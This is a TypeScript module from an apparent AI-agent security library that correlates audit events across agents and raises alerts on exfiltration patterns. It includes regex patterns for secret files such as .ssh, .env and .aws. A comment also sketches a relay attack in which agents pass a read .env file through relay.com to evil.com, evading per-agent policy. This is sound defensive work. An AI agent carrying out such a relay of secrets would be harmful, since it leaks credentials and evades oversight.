import { resolve, normalize } from "node:path";
import type { AuditEvent } from "@arikernel/core";
import { generateId, now } from "@arikernel/core";

/**
 * Configuration for the cross-principal correlator.
 */
/** CP-3 specific configuration to reduce noise and improve signal quality. */
export interface CP3Config {
	/** Hosts to ignore for CP-3 correlation (e.g. shared APIs that all agents use). */
	allowHosts?: string[];
	/** Hosts to suppress alerts for (still tracked, but alerts are not emitted). */
	suppressHosts?: string[];
	/** Deduplication window for CP-3 alerts per host. Default: 300000 (5 min). */
	dedupeWindowMs?: number;
}

export interface CorrelatorConfig {
	/** Time window for correlation in milliseconds. Default: 60000 (60s). */
	windowMs?: number;
	/** Max events buffered per principal. Default: 50. */
	maxEventsPerPrincipal?: number;
	/** When true, CP alerts automatically quarantine the offending principals. Default: false. */
	quarantineOnAlert?: boolean;
	/** CP-3 specific configuration for noise reduction. */
	cp3?: CP3Config;
}

export interface CrossPrincipalAlert {
	alertId: string;
	ruleId: string;
	severity: "low" | "medium" | "high";
	timestamp: string;
	principals: string[];
	reason: string;
	events: { principalId: string; toolClass: string; action: string; timestamp: string }[];
	/** Additional metadata for CP-3 alerts. */
	metadata?: {
		hostname?: string;
		principalsWithSensitiveReads?: string[];
		/** Whether the triggering calls were allowed or blocked by policy. */
		callsAllowed?: boolean;
	};
}

export type AlertHandler = (alert: CrossPrincipalAlert) => void;

/** Callback to quarantine a specific principal when an alert fires. */
export type QuarantineHandler = (principalId: string, ruleId: string, reason: string) => void;

interface PrincipalEvent {
	principalId: string;
	toolClass: string;
	action: string;
	timestamp: string;
	taintSources?: string[];
	params?: Record<string, unknown>;
	/** Canonical resource key for shared-store correlation (e.g. "db:messages", "file:/shared/data/x") */
	resourceKey?: string;
}

const SENSITIVE_PATH_PATTERNS = [
	/\.ssh/i,
	/\.env/i,
	/\.aws/i,
	/credentials/i,
	/password/i,
	/secret/i,
];

/** Write actions that indicate shared-store contamination. */
const SHARED_WRITE_ACTIONS = new Set(["write", "insert", "update", "create", "exec", "mutate"]);

/** Read actions that indicate shared-store consumption. */
const SHARED_READ_ACTIONS = new Set(["query", "read", "select", "get"]);

/**
 * Extract a canonical resource key from a tool event for correlation.
 * Returns null if the event doesn't target an identifiable shared resource.
 */
function extractResourceKey(toolClass: string, action: string, params?: Record<string, unknown>): string | null {
	if (toolClass === "database") {
		const table = params?.table as string | undefined;
		if (table) return `db:${table.normalize("NFKC").toLowerCase()}`;
		const database = params?.database as string | undefined;
		if (database) return `db:${database.normalize("NFKC").toLowerCase()}`;
	}
	if (toolClass === "file") {
		const filePath = params?.path as string | undefined;
		if (filePath) return `file:${normalize(resolve(filePath.normalize("NFKC")))}`;
	}
	return null;
}

/**
 * Cross-principal audit event correlator. Alerting only — does not block.
 *
 * Detects suspicious patterns across principal boundaries:
 * - CP-1: Principal A reads sensitive file + writes shared store resource X →
 *         Principal B reads shared store resource X + egresses
 *         (resource-key aware: write and read must target the same resource)
 * - CP-2: Any principal with `derived-sensitive` taint attempts HTTP write egress
 * - CP-3: Multiple principals egress to the same destination host within the
 *         correlation window, and at least one had a sensitive file read.
 *         Catches out-of-band relay attacks where Agent A posts to a relay
 *         and Agent B fetches from the same relay then exfiltrates elsewhere.
 */
export class CrossPrincipalCorrelator {
	private readonly windowMs: number;
	private readonly maxEvents: number;
	private readonly quarantineOnAlert: boolean;
	private readonly cp3AllowHosts: Set<string>;
	private readonly cp3SuppressHosts: Set<string>;
	private readonly cp3DedupeWindowMs: number;
	private readonly events = new Map<string, PrincipalEvent[]>();
	private readonly handlers: AlertHandler[] = [];
	private quarantineHandler: QuarantineHandler | null = null;
	/**
	 * Tracks recent egress destinations: hostname → set of {principalId, timestamp}.
	 * Used by CP-3 to detect multiple principals converging on the same host.
	 */
	private readonly egressHosts = new Map<string, { principalId: string; timestamp: string }[]>();
	/** Hosts that have already fired a CP-3 alert: hostname → fire timestamp. */
	private readonly cp3FiredHosts = new Map<string, number>();

	constructor(config?: CorrelatorConfig) {
		this.windowMs = config?.windowMs ?? 60_000;
		this.maxEvents = config?.maxEventsPerPrincipal ?? 50;
		this.quarantineOnAlert = config?.quarantineOnAlert ?? false;
		this.cp3AllowHosts = new Set((config?.cp3?.allowHosts ?? []).map((h) => h.toLowerCase()));
		this.cp3SuppressHosts = new Set((config?.cp3?.suppressHosts ?? []).map((h) => h.toLowerCase()));
		this.cp3DedupeWindowMs = config?.cp3?.dedupeWindowMs ?? 300_000;
	}

	/** Register an alert handler. */
	onAlert(handler: AlertHandler): void {
		this.handlers.push(handler);
	}

	/** Register a handler to quarantine principals when alerts fire. */
	onQuarantine(handler: QuarantineHandler): void {
		this.quarantineHandler = handler;
	}

	/** Ingest an audit event from any principal. */
	ingest(event: AuditEvent, principalId: string): void {
		// AuditEvent nests tool call data under event.toolCall
		const tc = event.toolCall;
		const toolClass = tc?.toolClass ?? (event as any).toolClass ?? "unknown";
		const action = tc?.action ?? (event as any).action ?? "unknown";
		const params = tc?.parameters ?? (event as any).parameters as Record<string, unknown> | undefined;
		const taintSources = tc?.taintLabels?.map((t: any) => t.source) ?? (event as any).taintSources as string[] | undefined;

		const pe: PrincipalEvent = {
			principalId,
			toolClass,
			action,
			timestamp: event.timestamp,
			taintSources,
			params,
			resourceKey: extractResourceKey(toolClass, action, params) ?? undefined,
		};

		let buffer = this.events.get(principalId);
		if (!buffer) {
			buffer = [];
			this.events.set(principalId, buffer);
		}
		buffer.push(pe);
		if (buffer.length > this.maxEvents) {
			buffer.shift();
		}

		this.evaluateCP1(pe);
		this.evaluateCP2(pe);
		this.evaluateCP3(pe);
	}

	/**
	 * CP-1: Cross-principal sensitive exfiltration via shared store.
	 * A reads sensitive → writes shared resource X → B reads resource X → B egresses.
	 * Resource-key aware: the write and read must target the same canonical resource.
	 * Fires when the final egress event is ingested.
	 */
	private evaluateCP1(triggerEvent: PrincipalEvent): void {
		// Trigger: HTTP write egress
		if (triggerEvent.toolClass !== "http") return;
		if (!["post", "put", "patch", "delete"].includes(triggerEvent.action)) return;

		const cutoff = Date.now() - this.windowMs;
		const egressPrincipal = triggerEvent.principalId;

		// Check if this principal recently read from a shared store (db query or file read)
		const egressBuffer = this.events.get(egressPrincipal) ?? [];
		const recentSharedReads = egressBuffer.filter(
			(e) =>
				new Date(e.timestamp).getTime() >= cutoff &&
				e.resourceKey !== null &&
				SHARED_READ_ACTIONS.has(e.action),
		);
		if (recentSharedReads.length === 0) return;

		// Collect resource keys that the egressing principal read
		const readResourceKeys = new Set(recentSharedReads.map((e) => e.resourceKey).filter(Boolean));

		// Check if a DIFFERENT principal wrote to any of those same resources after a sensitive read
		for (const [pid, buffer] of this.events) {
			if (pid === egressPrincipal) continue; // same-principal excluded

			const recentEvents = buffer.filter(
				(e) => new Date(e.timestamp).getTime() >= cutoff,
			);

			const hasSensitiveRead = recentEvents.some(
				(e) =>
					e.toolClass === "file" &&
					e.action === "read" &&
					e.params?.path &&
					SENSITIVE_PATH_PATTERNS.some((p) => p.test(String(e.params!.path))),
			);

			// Resource-key linkage: the write must target the SAME resource the egressing principal read
			const hasMatchingSharedWrite = recentEvents.some(
				(e) =>
					e.resourceKey !== null &&
					readResourceKeys.has(e.resourceKey) &&
					SHARED_WRITE_ACTIONS.has(e.action),
			);

			if (hasSensitiveRead && hasMatchingSharedWrite) {
				this.emit({
					alertId: generateId(),
					ruleId: "cross-principal-sensitive-exfil",
					severity: "high",
					timestamp: now(),
					principals: [pid, egressPrincipal],
					reason:
						`Principal '${pid}' read sensitive file and wrote to shared store; ` +
						`principal '${egressPrincipal}' then read from the same shared resource and attempted egress.`,
					events: [
						...recentEvents
							.filter(
								(e) =>
									(e.toolClass === "file" && e.action === "read") ||
									(e.resourceKey !== null && SHARED_WRITE_ACTIONS.has(e.action)),
							)
							.map((e) => ({
								principalId: pid,
								toolClass: e.toolClass,
								action: e.action,
								timestamp: e.timestamp,
							})),
						{
							principalId: egressPrincipal,
							toolClass: triggerEvent.toolClass,
							action: triggerEvent.action,
							timestamp: triggerEvent.timestamp,
						},
					],
				});
				return; // one alert per trigger
			}
		}
	}

	/**
	 * CP-2: Derived-sensitive egress.
	 * Any principal with `derived-sensitive` taint attempts HTTP write.
	 */
	private evaluateCP2(triggerEvent: PrincipalEvent): void {
		if (triggerEvent.toolClass !== "http") return;
		if (!["post", "put", "patch", "delete"].includes(triggerEvent.action)) return;

		if (
			triggerEvent.taintSources &&
			triggerEvent.taintSources.includes("derived-sensitive")
		) {
			this.emit({
				alertId: generateId(),
				ruleId: "derived-sensitive-egress",
				severity: "medium",
				timestamp: now(),
				principals: [triggerEvent.principalId],
				reason:
					`Principal '${triggerEvent.principalId}' attempted HTTP egress with derived-sensitive taint.`,
				events: [
					{
						principalId: triggerEvent.principalId,
						toolClass: triggerEvent.toolClass,
						action: triggerEvent.action,
						timestamp: triggerEvent.timestamp,
					},
				],
			});
		}
	}

	/**
	 * CP-3: Egress-destination convergence.
	 * Multiple principals egress (any HTTP verb) to the same host within the window,
	 * and at least one principal had a recent sensitive file read.
	 *
	 * Catches the out-of-band relay pattern:
	 *   Agent A: read(.env) → http.post(relay.com)   ← allowed by A's policy
	 *   Agent B: http.get(relay.com) → http.post(evil.com) ← allowed by B's policy
	 * Neither individual flow violates policy, but the convergence on relay.com is suspicious.
	 */
	private evaluateCP3(triggerEvent: PrincipalEvent): void {
		if (triggerEvent.toolClass !== "http") return;

		const url = triggerEvent.params?.url as string | undefined;
		if (!url) return;

		let hostname: string;
		try {
			hostname = new URL(url).hostname;
		} catch {
			return;
		}

		// Skip hosts explicitly allowed in CP-3 config (shared APIs all agents use)
		if (this.cp3AllowHosts.has(hostname.toLowerCase())) return;

		// Record this egress
		let hostEntries = this.egressHosts.get(hostname);
		if (!hostEntries) {
			hostEntries = [];
			this.egressHosts.set(hostname, hostEntries);
		}
		hostEntries.push({
			principalId: triggerEvent.principalId,
			timestamp: triggerEvent.timestamp,
		});

		// Prune expired entries
		const cutoff = Date.now() - this.windowMs;
		const active = hostEntries.filter(
			(e) => new Date(e.timestamp).getTime() >= cutoff,
		);
		this.egressHosts.set(hostname, active);

		// Prune expired CP-3 dedup entries using configurable dedup window
		const dedupCutoff = Date.now() - this.cp3DedupeWindowMs;
		for (const [firedHost, firedAt] of this.cp3FiredHosts.entries()) {
			if (firedAt < dedupCutoff) {
				this.cp3FiredHosts.delete(firedHost);
			}
		}

		// Need ≥2 distinct principals hitting this host
		const distinctPrincipals = new Set(active.map((e) => e.principalId));
		if (distinctPrincipals.size < 2) return;

		// Already fired for this host in dedup window?
		if (this.cp3FiredHosts.has(hostname)) return;

		// At least one principal must have a recent sensitive read
		const principalsWithSensitiveRead: string[] = [];
		for (const pid of distinctPrincipals) {
			const buffer = this.events.get(pid) ?? [];
			const hasSensitiveRead = buffer.some(
				(e) =>
					new Date(e.timestamp).getTime() >= cutoff &&
					e.toolClass === "file" &&
					e.action === "read" &&
					e.params?.path &&
					SENSITIVE_PATH_PATTERNS.some((p) => p.test(String(e.params!.path))),
			);
			if (hasSensitiveRead) {
				principalsWithSensitiveRead.push(pid);
			}
		}

		if (principalsWithSensitiveRead.length === 0) return;

		// Skip suppressed hosts (still tracked, no alert emitted)
		if (this.cp3SuppressHosts.has(hostname.toLowerCase())) return;

		this.cp3FiredHosts.set(hostname, Date.now());

		// Build event list from active entries
		const alertEvents = active.map((e) => ({
			principalId: e.principalId,
			toolClass: "http",
			action: triggerEvent.action,
			timestamp: e.timestamp,
		}));

		this.emit({
			alertId: generateId(),
			ruleId: "cross-principal-egress-convergence",
			severity: "high",
			timestamp: now(),
			principals: Array.from(distinctPrincipals),
			reason:
				`Multiple principals (${Array.from(distinctPrincipals).join(", ")}) egressed to the same host '${hostname}' ` +
				`within ${this.windowMs / 1000}s. Principals with sensitive reads: ${principalsWithSensitiveRead.join(", ")}. ` +
				`Possible out-of-band relay attack.`,
			events: alertEvents,
			metadata: {
				hostname,
				principalsWithSensitiveReads: principalsWithSensitiveRead,
			},
		});
	}

	private emit(alert: CrossPrincipalAlert): void {
		for (const handler of this.handlers) {
			try {
				handler(alert);
			} catch {
				/* handler errors must not crash correlator */
			}
		}

		// Quarantine all principals involved in the alert
		if (this.quarantineOnAlert && this.quarantineHandler) {
			for (const pid of alert.principals) {
				try {
					this.quarantineHandler(pid, alert.ruleId, alert.reason);
				} catch {
					/* quarantine errors must not crash correlator */
				}
			}
		}
	}
}
